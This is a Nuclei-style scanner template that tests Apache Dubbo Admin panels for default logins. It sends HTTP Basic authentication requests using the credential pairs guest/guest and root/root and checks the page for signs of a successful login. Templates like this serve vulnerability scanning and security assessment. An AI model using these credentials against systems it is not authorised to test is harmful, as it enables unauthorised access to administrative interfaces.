id: dubbo-admin-default-login
info:
  author: ritikchaddha
  name: Dubbo Admin Default Login
  reference:
  - https://www.cnblogs.com/wishwzp/p/9438658.html
  severity: high
  tags: dubbo,apache,default-login
requests:
- attack: pitchfork
  matchers:
  - condition: and
    type: word
    words:
    - <title>Dubbo Admin</title>
    - /sysinfo/versions
    - '{{username}}'', ''/logout'')'
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    password:
    - guest
    - root
    username:
    - guest
    - root
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/x-www-form-urlencoded

    Authorization: Basic {{base64(username + '':'' + password)}}

    '
